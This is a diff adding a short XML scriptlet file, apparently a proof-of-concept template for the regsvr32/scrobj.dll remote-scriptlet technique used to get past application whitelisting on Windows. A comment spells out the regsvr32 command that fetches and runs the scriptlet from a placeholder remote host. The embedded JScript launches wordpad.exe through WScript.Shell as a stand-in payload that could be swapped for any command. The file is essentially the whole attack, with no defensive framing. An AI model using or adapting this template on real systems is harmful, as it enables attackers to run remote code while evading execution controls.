@@ -1,0 +1,16 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="Test"
+    classid="{A0001234-0000-0000-0000-0000DEADBEEF}" >
+	<!-- regsvr32 /s /u /i:http://site.com|IP/file.sct scrobj.dll -->
+
+	<script language="JScript">
+		<![CDATA[
+
+			var r = new ActiveXObject("WScript.Shell").Run("wordpad.exe");	
+	
+		]]>
+</script>
+</registration>
+</scriptlet>
